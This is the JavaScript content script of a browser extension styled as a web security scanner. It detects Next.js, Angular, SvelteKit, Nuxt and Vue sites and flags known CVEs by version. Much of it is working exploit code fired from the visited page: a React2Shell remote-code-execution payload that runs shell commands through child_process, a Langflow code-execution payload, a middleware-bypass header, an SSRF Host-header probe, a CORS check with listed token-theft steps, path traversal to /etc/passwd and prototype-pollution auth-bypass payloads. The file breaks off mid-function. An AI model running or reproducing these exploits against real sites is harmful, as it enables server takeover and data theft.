/**
 * BlueDragon Web Security - Content Script
 * Main content script that runs in the context of web pages
 * Coordinates framework detection, scanning, and communication with background
 */

import { MESSAGE_TYPES, SKIP_DOMAINS, DEFAULT_SETTINGS } from '../shared/constants.js';
import { isBlockedEndpoint, RateLimiter } from '../shared/safety-filters.js';
import { quickDetect, detectFrameworks, detectRSC } from '../detection/index.js';

// State
let isInitialized = false;
let currentFramework = null;
let settings = { ...DEFAULT_SETTINGS };
let scanResults = [];
let capturedRequests = [];
let rateLimiter = new RateLimiter(5);

/**
 * Initialize the content script
 */
async function init() {
  if (isInitialized) return;
  isInitialized = true;

  console.log('[BlueDragon] Content script initializing...');

  // Check if we should skip this domain
  if (shouldSkipDomain(window.location.hostname)) {
    console.log('[BlueDragon] Skipping domain:', window.location.hostname);
    return;
  }

  // Load settings
  try {
    const stored = await chrome.storage.local.get('settings');
    if (stored.settings) {
      settings = { ...DEFAULT_SETTINGS, ...stored.settings };
    }
  } catch (e) {
    console.warn('[BlueDragon] Failed to load settings:', e);
  }

  // Quick framework detection
  currentFramework = quickDetect(document);

  if (currentFramework) {
    console.log('[BlueDragon] Framework detected:', currentFramework.framework);

    // Notify background
    sendMessage({
      type: MESSAGE_TYPES.FRAMEWORK_DETECTED,
      data: {
        url: window.location.href,
        framework: currentFramework,
        timestamp: Date.now()
      }
    });
  }

  // Set up message listener
  chrome.runtime.onMessage.addListener(handleMessage);

  // Set up network interception if enabled
  if (settings.enableDynamicAnalysis !== false) {
    injectNetworkHooks();
  }

  // Auto-scan if enabled
  if (settings.autoScanEnabled) {
    setTimeout(() => {
      performScan('auto');
    }, settings.scanDelay || 3000);
  }

  console.log('[BlueDragon] Content script initialized');
}

/**
 * Check if we should skip scanning this domain
 * @param {string} hostname - Domain to check
 * @returns {boolean}
 */
function shouldSkipDomain(hostname) {
  return SKIP_DOMAINS.some(domain => {
    if (domain.startsWith('.')) {
      return hostname.endsWith(domain) || hostname === domain.slice(1);
    }
    return hostname === domain || hostname.endsWith('.' + domain);
  });
}

/**
 * Handle messages from popup/background
 * @param {Object} message - Message object
 * @param {Object} sender - Sender info
 * @param {Function} sendResponse - Response callback
 */
function handleMessage(message, sender, sendResponse) {
  console.log('[BlueDragon] Message received:', message.type);

  switch (message.type) {
    case 'PING':
      sendResponse({ success: true, loaded: true });
      return false;

    case MESSAGE_TYPES.START_SCAN:
      performScan(message.scanType || 'manual')
        .then(results => sendResponse({ success: true, results }))
        .catch(error => sendResponse({ success: false, error: error.message }));
      return true; // Keep channel open for async response

    case MESSAGE_TYPES.STOP_SCAN:
      stopScan();
      sendResponse({ success: true });
      break;

    case MESSAGE_TYPES.GET_STATUS:
      sendResponse({
        framework: currentFramework,
        scanResults,
        capturedRequests: capturedRequests.length,
        url: window.location.href
      });
      break;

    case MESSAGE_TYPES.TEST_EXPLOIT:
      performExploit(message.vulnType, message.options)
        .then(result => sendResponse({ success: true, result }))
        .catch(error => sendResponse({ success: false, error: error.message }));
      return true; // Async response

    default:
      console.warn('[BlueDragon] Unknown message type:', message.type);
  }

  return false;
}

/**
 * Send message to background script
 * @param {Object} message - Message to send
 */
function sendMessage(message) {
  try {
    chrome.runtime.sendMessage(message);
  } catch (e) {
    console.warn('[BlueDragon] Failed to send message:', e);
  }
}

/**
 * Perform vulnerability scan
 * @param {string} scanType - Type of scan (auto, manual, deep)
 * @returns {Promise<Object[]>} - Scan results
 */
async function performScan(scanType = 'manual') {
  console.log(`[BlueDragon] Starting ${scanType} scan...`);

  scanResults = [];
  const startTime = Date.now();

  try {
    // Full framework detection
    const frameworks = await detectFrameworks(document, {
      deep: scanType === 'deep'
    });

    if (frameworks.length > 0) {
      currentFramework = frameworks[0];
    }

    // Detect RSC if applicable
    let rscInfo = null;
    if (currentFramework?.framework === 'Next.js' || currentFramework?.hasRSC) {
      rscInfo = detectRSC(document);
    }

    // Import and run appropriate scanners based on framework
    if (currentFramework) {
      const scannerResults = await runFrameworkScanners(
        currentFramework,
        rscInfo,
        scanType
      );
      scanResults.push(...scannerResults);
    }

    // Run generic scanners
    const genericResults = await runGenericScanners(scanType);
    scanResults.push(...genericResults);

    // Sort by severity
    scanResults.sort((a, b) => {
      const severityOrder = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, INFO: 4 };
      return severityOrder[a.severity] - severityOrder[b.severity];
    });

    const scanTime = Date.now() - startTime;
    console.log(`[BlueDragon] Scan complete in ${scanTime}ms, found ${scanResults.length} issues`);

    // Notify background of results
    sendMessage({
      type: MESSAGE_TYPES.SCAN_COMPLETE,
      data: {
        url: window.location.href,
        framework: currentFramework,
        results: scanResults,
        scanTime,
        scanType
      }
    });

    return scanResults;

  } catch (error) {
    console.error('[BlueDragon] Scan error:', error);
    throw error;
  }
}

/**
 * Run framework-specific scanners
 * @param {Object} framework - Detected framework
 * @param {Object} rscInfo - RSC detection info
 * @param {string} scanType - Scan type
 * @returns {Promise<Object[]>} - Scanner results
 */
async function runFrameworkScanners(framework, rscInfo, scanType) {
  const results = [];

  try {
    switch (framework.framework) {
      case 'Next.js':
        // Import React/Next.js scanners dynamically
        const { checkReact2ShellVulnerable } = await import('../detection/react-detector.js');

        // Check for React2Shell vulnerability
        if (framework.hasRSC || rscInfo?.detected) {
          const react2shellCheck = checkReact2ShellVulnerable(framework.version);
          if (react2shellCheck.vulnerable === true) {
            results.push({
              id: generateId(),
              type: 'RCE',
              name: 'React2Shell (CVE-2025-55182)',
              severity: 'CRITICAL',
              cvss: 10.0,
              cve: 'CVE-2025-55182',
              description: react2shellCheck.reason,
              url: window.location.href,
              framework: framework.framework,
              version: framework.version,
              indicators: framework.indicators,
              exploitable: true,
              requiresProbe: true,
              timestamp: Date.now()
            });
          } else if (react2shellCheck.vulnerable === 'unknown') {
            results.push({
              id: generateId(),
              type: 'RCE',
              name: 'React2Shell (CVE-2025-55182) - Unconfirmed',
              severity: 'HIGH',
              cve: 'CVE-2025-55182',
              description: 'RSC detected but version unknown. Manual verification required.',
              url: window.location.href,
              framework: framework.framework,
              indicators: ['RSC detected', ...framework.indicators],
              requiresProbe: true,
              timestamp: Date.now()
            });
          }
        }

        // Check for Server Action SSRF
        if (framework.serverActions?.length > 0) {
          results.push({
            id: generateId(),
            type: 'SSRF',
            name: 'Server Action SSRF (CVE-2024-34351)',
            severity: 'HIGH',
            cvss: 7.5,
            cve: 'CVE-2024-34351',
            description: 'Server Actions detected. Host header injection may lead to SSRF.',
            url: window.location.href,
            framework: framework.framework,
            endpoints: framework.serverActions,
            requiresProbe: true,
            timestamp: Date.now()
          });
        }

        // Check for Image optimization endpoint
        results.push(...await checkNextImageEndpoint());
        break;

      case 'Angular':
        const { checkRaceConditionVulnerable, checkSSRFVulnerable } = await import('../detection/angular-detector.js');

        // Check race condition
        const raceCheck = checkRaceConditionVulnerable(framework.version, framework.isSSR);
        if (raceCheck.vulnerable === true) {
          results.push({
            id: generateId(),
            type: 'Race Condition',
            name: 'Angular SSR Race Condition (CVE-2025-59052)',
            severity: 'HIGH',
            cvss: 7.1,
            cve: 'CVE-2025-59052',
            description: raceCheck.reason,
            url: window.location.href,
            framework: framework.framework,
            version: framework.version,
            note: raceCheck.note,
            requiresProbe: false, // Hard to probe safely
            timestamp: Date.now()
          });
        }

        // Check SSRF
        const ssrfCheck = checkSSRFVulnerable(framework.version, framework.isSSR);
        if (ssrfCheck.vulnerable === true) {
          results.push({
            id: generateId(),
            type: 'SSRF',
            name: 'Angular SSR SSRF (CVE-2025-62427)',
            severity: 'HIGH',
            cvss: 8.7,
            cve: 'CVE-2025-62427',
            description: ssrfCheck.reason,
            url: window.location.href,
            framework: framework.framework,
            version: framework.version,
            testVector: ssrfCheck.testVector,
            requiresProbe: true,
            timestamp: Date.now()
          });
        }
        break;

      case 'SvelteKit':
        const { checkCSRFBypassVulnerable, checkTemplateXSSVulnerable } = await import('../detection/svelte-detector.js');

        // Check CSRF bypass
        const csrfCheck = checkCSRFBypassVulnerable(framework.version);
        if (csrfCheck.vulnerable === true) {
          results.push({
            id: generateId(),
            type: 'CSRF',
            name: 'SvelteKit CSRF Bypass (CVE-2023-29008)',
            severity: 'MEDIUM',
            cvss: 6.5,
            cve: 'CVE-2023-29008',
            description: csrfCheck.reason,
            url: window.location.href,
            framework: framework.framework,
            version: framework.version,
            testVector: csrfCheck.testVector,
            requiresProbe: true,
            timestamp: Date.now()
          });
        }

        // Check template XSS
        const xssCheck = checkTemplateXSSVulnerable(framework.version);
        if (xssCheck.vulnerable === true) {
          results.push({
            id: generateId(),
            type: 'XSS',
            name: 'SvelteKit Template XSS (CVE-2024-53262)',
            severity: 'MEDIUM',
            cvss: 6.1,
            cve: 'CVE-2024-53262',
            description: xssCheck.reason,
            url: window.location.href,
            framework: framework.framework,
            version: framework.version,
            note: xssCheck.note,
            requiresProbe: true,
            timestamp: Date.now()
          });
        }
        break;

      case 'Nuxt':
        const { checkDevInjectionVulnerable } = await import('../detection/vue-detector.js');

        // Check dev injection
        const devCheck = checkDevInjectionVulnerable(framework.version, framework.isDev);
        if (devCheck.vulnerable === true) {
          results.push({
            id: generateId(),
            type: 'RCE',
            name: 'Nuxt Dev Server Injection (CVE-2023-3224)',
            severity: 'CRITICAL',
            cvss: 9.8,
            cve: 'CVE-2023-3224',
            description: devCheck.reason,
            url: window.location.href,
            framework: framework.framework,
            version: framework.version,
            note: devCheck.note,
            exploitable: true,
            requiresProbe: true,
            timestamp: Date.now()
          });
        } else if (framework.isDev) {
          results.push({
            id: generateId(),
            type: 'Configuration',
            name: 'Development Mode Exposed',
            severity: 'HIGH',
            description: 'Nuxt development server is publicly accessible',
            url: window.location.href,
            framework: framework.framework,
            timestamp: Date.now()
          });
        }
        break;

      case 'Vue.js':
        const { checkPrototypePollutionVulnerable } = await import('../detection/vue-detector.js');

        // Check Vuetify prototype pollution
        if (framework.hasVuetify) {
          const protoCheck = checkPrototypePollutionVulnerable(framework.vuetifyVersion);
          if (protoCheck.vulnerable === true) {
            results.push({
              id: generateId(),
              type: 'Prototype Pollution',
              name: 'Vuetify Prototype Pollution (CVE-2025-8083)',
              severity: 'HIGH',
              cvss: 7.5,
              cve: 'CVE-2025-8083',
              description: protoCheck.reason,
              url: window.location.href,
              framework: 'Vuetify',
              version: framework.vuetifyVersion,
              note: protoCheck.note,
              requiresProbe: true,
              timestamp: Date.now()
            });
          }
        }
        break;
    }
  } catch (error) {
    console.error('[BlueDragon] Framework scanner error:', error);
  }

  return results;
}

/**
 * Check Next.js image optimization endpoint
 * @returns {Promise<Object[]>}
 */
async function checkNextImageEndpoint() {
  const results = [];

  try {
    // Check if /_next/image endpoint exists
    const testUrl = new URL('/_next/image', window.location.origin);
    testUrl.searchParams.set('url', 'https://example.com/test.jpg');
    testUrl.searchParams.set('w', '64');
    testUrl.searchParams.set('q', '75');

    const response = await fetch(testUrl.toString(), { method: 'HEAD' });

    if (response.status !== 404) {
      results.push({
        id: generateId(),
        type: 'Configuration',
        name: 'Next.js Image Optimization Endpoint',
        severity: 'LOW',
        description: 'Image optimization endpoint is accessible. May be vulnerable to DoS (CVE-2024-47831) if external URLs are allowed.',
        url: testUrl.toString(),
        endpoint: '/_next/image',
        requiresProbe: true,
        timestamp: Date.now()
      });
    }
  } catch (e) {
    // Endpoint not accessible or error
  }

  return results;
}

/**
 * Run generic (cross-framework) scanners
 * @param {string} scanType - Scan type
 * @returns {Promise<Object[]>}
 */
async function runGenericScanners(scanType) {
  const results = [];

  // Check security headers
  results.push(...checkSecurityHeaders());

  // Check for common misconfigurations
  results.push(...checkMisconfigurations());

  return results;
}

/**
 * Check for missing security headers
 * @returns {Object[]}
 */
function checkSecurityHeaders() {
  const results = [];

  // We can only check headers on navigation responses in content scripts
  // This is a basic check - more thorough checking should be done in background

  // Check for CSP meta tag
  const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
  if (!cspMeta) {
    results.push({
      id: generateId(),
      type: 'Header',
      name: 'Missing Content-Security-Policy',
      severity: 'LOW',
      description: 'No CSP meta tag found. CSP header should be verified.',
      url: window.location.href,
      timestamp: Date.now()
    });
  }

  // Check for X-Frame-Options meta tag
  const frameOptions = document.querySelector('meta[http-equiv="X-Frame-Options"]');
  if (!frameOptions) {
    results.push({
      id: generateId(),
      type: 'Header',
      name: 'Possible Clickjacking Risk',
      severity: 'INFO',
      description: 'No X-Frame-Options meta tag found. Header should be verified.',
      url: window.location.href,
      timestamp: Date.now()
    });
  }

  return results;
}

/**
 * Check for common misconfigurations
 * @returns {Object[]}
 */
function checkMisconfigurations() {
  const results = [];

  // Check for exposed source maps
  const scripts = document.querySelectorAll('script[src]');
  for (const script of scripts) {
    if (script.src.includes('.map') || script.src.includes('sourcemap')) {
      results.push({
        id: generateId(),
        type: 'Configuration',
        name: 'Source Map Exposed',
        severity: 'LOW',
        description: 'Source maps may expose original source code',
        url: script.src,
        timestamp: Date.now()
      });
      break; // Only report once
    }
  }

  // Check for debug endpoints
  const debugPatterns = [
    '/_debug',
    '/_profiler',
    '/debug',
    '/__debug__'
  ];

  for (const pattern of debugPatterns) {
    const debugLink = document.querySelector(`a[href*="${pattern}"]`);
    if (debugLink) {
      results.push({
        id: generateId(),
        type: 'Configuration',
        name: 'Debug Endpoint Exposed',
        severity: 'MEDIUM',
        description: `Debug endpoint found: ${pattern}`,
        url: debugLink.href,
        timestamp: Date.now()
      });
    }
  }

  return results;
}

/**
 * Stop ongoing scan
 */
function stopScan() {
  console.log('[BlueDragon] Scan stopped');
  // Implement scan cancellation logic
}

/**
 * Perform exploit testing based on vulnerability type
 * @param {string} vulnType - Type of vulnerability to test
 * @param {Object} options - Exploit options
 * @returns {Promise<Object>} - Exploit result
 */
async function performExploit(vulnType, options = {}) {
  console.log('[BlueDragon] Testing exploit:', vulnType, options);

  switch (vulnType) {
    case 'react2shell':
    case 'CVE-2025-55182':
      return await testReact2Shell(options);

    case 'middleware-bypass':
    case 'CVE-2025-29927':
      return await testMiddlewareBypass(options);

    case 'server-action-ssrf':
    case 'CVE-2024-34351':
      return await testServerActionSSRF(options);

    case 'langflow-rce':
    case 'CVE-2025-3248':
      return await testLangflowRCE(options);

    case 'langflow-cors-rce':
    case 'CVE-2025-34291':
      return await testLangflowCORS(options);

    case 'path-traversal':
      return await testPathTraversal(options);

    case 'prototype-pollution':
      return await testPrototypePollution(options);

    case 'angular-race-condition':
    case 'CVE-2025-59052':
      return await testAngularRaceCondition(options);

    case 'angular-ssrf':
    case 'CVE-2025-62427':
      return await testAngularSSRF(options);

    case 'image-dos':
    case 'CVE-2024-47831':
      return await testImageOptimizationDoS(options);

    default:
      throw new Error(`Exploit test not implemented for: ${vulnType}`);
  }
}

/**
 * Test React2Shell RCE vulnerability (CVE-2025-55182)
 * Uses Flight protocol deserialization to execute commands
 * @param {Object} options - Test options
 * @returns {Promise<Object>} - Test result
 */
async function testReact2Shell(options = {}) {
  const REDIRECT_PREFIX = 'NEXT_REDIRECT';
  const cmd = options.command || 'echo BlueDragon_Test_$(date +%s)';
  const targetPath = options.path || window.location.pathname || '/';

  // Escape command for shell execution
  const escapedCmd = cmd.replace(/'/g, "'\\''");

  // Build JavaScript payload that executes on server via prototype pollution
  const prefixCode =
    `var res=process.mainModule.require('child_process').execSync('${escapedCmd}')` +
    `.toString().trim();var encoded=Buffer.from(res).toString('base64');` +
    `throw Object.assign(new Error('${REDIRECT_PREFIX}'),` +
    `{digest:'${REDIRECT_PREFIX};push;/login?a='+encoded+';307;'});`;

  // Payload exploiting prototype chain via thenable objects
  const payloadObj = {
    'then': '$1:__proto__:then',
    'status': 'resolved_model',
    'reason': -1,
    'value': '{"then":"$B1337"}',
    '_response': {
      '_prefix': prefixCode,
      '_chunks': '$Q2',
      '_formData': {
        'get': '$1:constructor:constructor'
      }
    }
  };

  const payloadJson = JSON.stringify(payloadObj);
  const boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad';

  const bodyParts = [
    `--${boundary}`,
    'Content-Disposition: form-data; name="0"',
    '',
    payloadJson,
    `--${boundary}`,
    'Content-Disposition: form-data; name="1"',
    '',
    '"$@0"',
    `--${boundary}`,
    'Content-Disposition: form-data; name="2"',
    '',
    '[]',
    `--${boundary}--`,
    ''
  ].join('\r\n');

  try {
    // Enable header rules for CORS bypass
    await chrome.runtime.sendMessage({
      type: MESSAGE_TYPES.ENABLE_HEADER_RULES,
      domain: new URL(window.location.href).hostname
    });

    const res = await fetch(targetPath, {
      method: 'POST',
      headers: {
        'Next-Action': 'x',
        'Content-Type': `multipart/form-data; boundary=${boundary}`
      },
      body: bodyParts
    });

    const statusCode = res.status;

    // Check common error conditions
    if (statusCode === 404) {
      return {
        vulnerable: false,
        message: `Path not found (404): ${targetPath}`,
        suggestion: 'Try a different exploit path'
      };
    }

    if (statusCode === 405) {
      return {
        vulnerable: false,
        message: `Method not allowed (405): POST to ${targetPath}`,
        suggestion: 'This endpoint may not accept POST requests'
      };
    }

    // Primary extraction: X-Action-Redirect header
    const redirectHeader = res.headers.get('X-Action-Redirect') || '';
    const headerMatch = redirectHeader.match(/\/login\?a=([^;]+)/);

    if (headerMatch && headerMatch[1]) {
      try {
        const decoded = atob(decodeURIComponent(headerMatch[1]));
        return {
          vulnerable: true,
          output: decoded,
          path: targetPath,
          command: cmd,
          message: 'RCE confirmed! Command output captured.',
          severity: 'CRITICAL'
        };
      } catch (decodeError) {
        // Fall through to body extraction
      }
    }

    // Fallback: Extract from response body digest field
    const responseText = await res.text();
    const digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);

    if (digestMatch && digestMatch[1]) {
      let rawValue = digestMatch[1];

      try {
        // Check if it's the redirect format
        const redirectMatch = rawValue.match(/NEXT_REDIRECT;push;\/login\?a=([^;]+);/);
        if (redirectMatch) {
          const decoded = atob(decodeURIComponent(redirectMatch[1]));
          return {
            vulnerable: true,
            output: decoded,
            path: targetPath,
            command: cmd,
            message: 'RCE confirmed! Command output captured from response body.',
            severity: 'CRITICAL'
          };
        }

        // Try direct base64 decode
        let cleanBase64 = JSON.parse(`"${rawValue}"`);
        const decodedStr = new TextDecoder().decode(
          Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
        );

        return {
          vulnerable: true,
          output: decodedStr,
          path: targetPath,
          command: cmd,
          message: 'RCE confirmed!',
          severity: 'CRITICAL'
        };
      } catch (parseError) {
        return {
          vulnerable: 'possible',
          message: 'Response received but decoding failed',
          debug: rawValue.substring(0, 100)
        };
      }
    }

    // Check if response contains indicators of non-vulnerable app
    if (responseText.includes('<!DOCTYPE') || responseText.includes('<html')) {
      return {
        vulnerable: false,
        message: 'Target returned HTML - likely not vulnerable or wrong path',
        suggestion: 'This may not be a vulnerable RSC endpoint'
      };
    }

    return {
      vulnerable: 'unknown',
      message: 'No clear indication of vulnerability',
      statusCode,
      debug: responseText.substring(0, 200)
    };

  } catch (e) {
    if (e.name === 'TypeError' && e.message.includes('Failed to fetch')) {
      return {
        vulnerable: 'unknown',
        message: 'Request blocked (CORS or network error)',
        suggestion: 'Header rules may not be properly configured'
      };
    }

    return {
      vulnerable: false,
      message: 'Network error: ' + e.message
    };
  } finally {
    // Disable header rules
    await chrome.runtime.sendMessage({
      type: MESSAGE_TYPES.DISABLE_HEADER_RULES
    }).catch(() => {});
  }
}

/**
 * Test Middleware Bypass vulnerability (CVE-2025-29927)
 * @param {Object} options - Test options
 * @returns {Promise<Object>} - Test result
 */
async function testMiddlewareBypass(options = {}) {
  const testPaths = options.paths || ['/admin', '/dashboard', '/api/admin', '/settings', '/profile'];
  const results = [];

  for (const path of testPaths) {
    try {
      const testUrl = new URL(path, window.location.origin).toString();

      // Request without bypass header
      const normalResponse = await fetch(testUrl, {
        method: 'GET',
        redirect: 'manual'
      });

      // Request with bypass header
      const bypassResponse = await fetch(testUrl, {
        method: 'GET',
        headers: {
          'x-middleware-subrequest': '1'
        },
        redirect: 'manual'
      });

      // Check if bypass worked
      if (normalResponse.status !== bypassResponse.status) {
        const wasProtected = [302, 401, 403].includes(normalResponse.status);
        const gotAccess = [200, 304].includes(bypassResponse.status);

        if (wasProtected && gotAccess) {
          return {
            vulnerable: true,
            path: testUrl,
            normalStatus: normalResponse.status,
            bypassStatus: bypassResponse.status,
            message: `Middleware bypass confirmed on ${path}!`,
            severity: 'CRITICAL'
          };
        }

        results.push({
          path,
          normalStatus: normalResponse.status,
          bypassStatus: bypassResponse.status,
          note: 'Status differs but may not indicate bypass'
        });
      }
    } catch (e) {
      // Continue to next path
    }
  }

  if (results.length > 0) {
    return {
      vulnerable: 'possible',
      message: 'Some paths showed different behavior with bypass header',
      results
    };
  }

  return {
    vulnerable: false,
    message: 'No bypass detected on tested paths',
    testedPaths: testPaths
  };
}

/**
 * Test Server Action SSRF vulnerability (CVE-2024-34351)
 * @param {Object} options - Test options
 * @returns {Promise<Object>} - Test result
 */
async function testServerActionSSRF(options = {}) {
  const collaboratorUrl = options.collaboratorUrl || settings.collaboratorUrl;

  if (!collaboratorUrl) {
    return {
      vulnerable: 'untested',
      message: 'SSRF testing requires a collaborator URL. Configure one in settings.',
      suggestion: 'Set up Burp Collaborator, Interactsh, or a custom webhook'
    };
  }

  // Find server action endpoints
  const actionForms = document.querySelectorAll('form[action]');
  const serverActions = [];

  for (const form of actionForms) {
    const action = form.getAttribute('action');
    if (action && (action.includes('$ACTION') || action.startsWith('/'))) {
      serverActions.push({
        url: action.startsWith('/') ? new URL(action, window.location.origin).toString() : action,
        method: form.method || 'POST'
      });
    }
  }

  if (serverActions.length === 0) {
    return {
      vulnerable: 'untested',
      message: 'No Server Action endpoints found on this page',
      suggestion: 'Look for forms with Server Actions'
    };
  }

  // Generate unique collaborator ID
  const collaboratorId = 'bd-' + Math.random().toString(36).substr(2, 9);
  const fullCollaboratorUrl = `${collaboratorId}.${collaboratorUrl}`;

  // Try first action endpoint
  const action = serverActions[0];

  try {
    await fetch(action.url, {
      method: 'POST',
      headers: {
        'Host': fullCollaboratorUrl,
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: '',
      credentials: 'omit'
    });

    return {
      vulnerable: 'possible',
      message: `SSRF probe sent to ${action.url}`,
      collaboratorId,
      note: 'Check your collaborator for incoming requests',
      endpoints: serverActions.map(a => a.url)
    };
  } catch (e) {
    return {
      vulnerable: 'unknown',
      message: 'Could not send SSRF probe: ' + e.message,
      endpoints: serverActions.map(a => a.url)
    };
  }
}

/**
 * Test Langflow RCE vulnerability (CVE-2025-3248)
 * Unauthenticated code execution via /api/v1/validate/code
 * @param {Object} options - Test options
 * @returns {Promise<Object>} - Test result
 */
async function testLangflowRCE(options = {}) {
  const cmd = options.command || 'echo BlueDragon_$(whoami)_$(date +%s)';
  const endpoint = options.endpoint || new URL('/api/v1/validate/code', window.location.origin).toString();

  // Build the payload that exploits exec() via function default parameter
  const payload = {
    code: `def run(cd=exec('raise Exception(__import__("subprocess").check_output("${cmd}", shell=True))')): pass`
  };

  try {
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(10000)
    });

    const statusCode = response.status;

    if (statusCode === 404) {
      return {
        vulnerable: false,
        message: 'Langflow endpoint not found',
        suggestion: 'This may not be a Langflow instance'
      };
    }

    if (statusCode === 401 || statusCode === 403) {
      return {
        vulnerable: false,
        message: 'Langflow requires authentication (not vulnerable to CVE-2025-3248)',
        note: 'May still be vulnerable to CVE-2025-34291 via CORS chain'
      };
    }

    if (statusCode === 200) {
      const data = await response.json();

      // Check for command output in error response
      const errors = data?.function?.errors || [];
      if (errors.length > 0) {
        const errorStr = errors[0];

        // Extract command output from exception message
        if (typeof errorStr === 'string' && errorStr.startsWith("b'")) {
          const output = errorStr.slice(2, -1)
            .replace(/\\n/g, '\n')
            .replace(/\\t/g, '\t')
            .trim();

          return {
            vulnerable: true,
            output,
            endpoint,
            command: cmd,
            message: 'RCE confirmed! Command executed successfully.',
            severity: 'CRITICAL'
          };
        }
      }

      // Check if response indicates code was validated (still vulnerable)
      if (data?.function || data?.imports) {
        return {
          vulnerable: 'possible',
          message: 'Endpoint accepts code for validation. May be vulnerable.',
          statusCode,
          response: JSON.stringify(data).substring(0, 200)
        };
      }
    }

    return {
      vulnerable: 'unknown',
      message: 'Unexpected response',
      statusCode
    };

  } catch (e) {
    return {
      vulnerable: false,
      message: 'Request failed: ' + e.message
    };
  }
}

/**
 * Test Langflow CORS/CSRF Chain vulnerability (CVE-2025-34291)
 * Account takeover via CORS misconfiguration on token refresh endpoint
 * @param {Object} options - Test options
 * @returns {Promise<Object>} - Test result
 */
async function testLangflowCORS(options = {}) {
  const refreshEndpoint = options.endpoint || new URL('/api/v1/refresh', window.location.origin).toString();

  try {
    // Send request with attacker origin to test CORS
    const response = await fetch(refreshEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Origin': 'https://evil.attacker.com'
      },
      credentials: 'include',
      signal: AbortSignal.timeout(5000)
    });

    const corsOrigin = response.headers.get('access-control-allow-origin');
    const corsCredentials = response.headers.get('access-control-allow-credentials');

    // Check for permissive CORS
    if (corsOrigin === '*' || corsOrigin === 'https://evil.attacker.com') {
      if (corsCredentials === 'true') {
        return {
          vulnerable: true,
          endpoint: refreshEndpoint,
          message: 'CRITICAL: CORS allows any origin with credentials! Account takeover possible.',
          severity: 'CRITICAL',
          corsConfig: {
            allowOrigin: corsOrigin,
            allowCredentials: corsCredentials
          },
          exploitSteps: [
            '1. Host malicious page that makes fetch() to victim Langflow',
            '2. Steal refresh_token from response (credentials included)',
            '3. Use stolen token to authenticate to /api/v1/validate/code',
            '4. Execute arbitrary code on the server'
          ]
        };
      }

      return {
        vulnerable: 'possible',
        message: 'CORS is permissive but credentials not allowed. Limited impact.',
        corsConfig: {
          allowOrigin: corsOrigin,
          allowCredentials: corsCredentials
        }
      };
    }

    // Check response for additional indicators
    if (response.status === 200) {
      const data = await response.json().catch(() => null);

      if (data?.access_token || data?.refresh_token) {
        return {
          vulnerable: 'possible',
          message: 'Token refresh endpoint is accessible. Check cookie configuration.',
          note: 'If cookies have SameSite=None, may still be exploitable'
        };
      }
    }

    return {
      vulnerable: false,
      message: 'CORS properly configured or endpoint not accessible',
      corsOrigin
    };

  } catch (e) {
    return {
      vulnerable: 'unknown',
      message: 'Request failed: ' + e.message
    };
  }
}

/**
 * Test Path Traversal vulnerability
 * @param {Object} options - Test options
 * @returns {Promise<Object>} - Test result
 */
async function testPathTraversal(options = {}) {
  const traversalPath = options.command || '../../../../etc/passwd';
  const endpoint = options.endpoint || '/api/image';

  // Common file-serving endpoints to test
  const testEndpoints = [
    endpoint,
    '/api/image',
    '/api/file',
    '/api/download',
    '/api/asset',
    '/api/serve'
  ];

  // Common parameter names
  const paramNames = ['path', 'file', 'filename', 'src'];

  // Indicators of successful /etc/passwd read
  const passwdIndicators = ['root:', 'nobody:', 'daemon:', '/bin/bash', '/bin/sh', ':x:'];
  const winIndicators = ['[fonts]', '[extensions]', '[mci extensions]'];

  for (const ep of [...new Set(testEndpoints)]) {
    for (const param of paramNames) {
      try {
        const testUrl = new URL(ep, window.location.origin);
        testUrl.searchParams.set(param, traversalPath);

        const response = await fetch(testUrl.toString(), {
          method: 'GET',
          signal: AbortSignal.timeout(5000)
        });

        if (!response.ok) continue;

        const text = await response.text();

        // Check for Linux passwd file
        const matchedPasswd = passwdIndicators.filter(ind => text.includes(ind));
        if (matchedPasswd.length >= 2) {
          return {
            vulnerable: true,
            output: text.substring(0, 1000),
            endpoint: ep,
            param,
            payload: traversalPath,
            message: `Path traversal confirmed! Read /etc/passwd via ${ep}?${param}=`,
            severity: 'CRITICAL',
            matchedIndicators: matchedPasswd
          };
        }

        // Check for Windows win.ini
        const matchedWin = winIndicators.filter(ind => text.includes(ind));
        if (matchedWin.length >= 1) {
          return {
            vulnerable: true,
            output: text.substring(0, 1000),
            endpoint: ep,
            param,
            payload: traversalPath,
            message: `Path traversal confirmed! Read win.ini via ${ep}?${param}=`,
            severity: 'CRITICAL'
          };
        }
      } catch (e) {
        // Continue to next endpoint
      }
    }
  }

  return {
    vulnerable: false,
    message: 'Path traversal not detected on tested endpoints',
    testedEndpoints: testEndpoints,
    suggestion: 'Try different file paths or parameter names'
  };
}

/**
 * Test Prototype Pollution auth bypass vulnerability
 * @param {Object} options - Test options
 * @returns {Promise<Object>} - Test result
 */
async function testPrototypePollution(options = {}) {
  const endpoint = options.endpoint || '/api/test-action';

  // Common auth endpoints to test
  const testEndpoints = [
    endpoint,
    '/api/auth',
    '/api/login',
    '/api/user',
    '/api/admin',
    '/api/profile',
    '/api/account'
  ];

  // Prototype pollution payloads
  const pollutionPayloads = [
    { name: '__proto__.isAdmin', payload: { "__proto__": { "isAdmin": true }, "username": "test" } },
    { name: '__proto__.role', payload: { "__proto__": { "role": "admin" }, "username": "test" } },
    { name: '__proto__.authenticated', payload: { "__proto__": { "authenticated": true }, "username": "test" } },
    { name: 'constructor.prototype', payload: { "constructor": { "prototype": { "isAdmin": true } }, "username": "test" } }
  ];

  // Indicators of auth bypass
  const bypassIndicators = ['admin', 'secret', 'granted', 'authorized', 'private', 'token', 'jwt', 'API_KEY'];

  for (const ep of [...new Set(testEndpoints)]) {
    // First get baseline
    let baselineBody = '';
    let baselineStatus = 0;

    try {
      const baselineUrl = new URL(ep, window.location.origin);
      const baselineResponse = await fetch(baselineUrl.toString(), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'test' }),
        signal: AbortSignal.timeout(5000)
      });
      baselineStatus = baselineResponse.status;
      baselineBody = await baselineResponse.text();
    } catch (e) {
      continue; // Endpoint doesn't work
    }

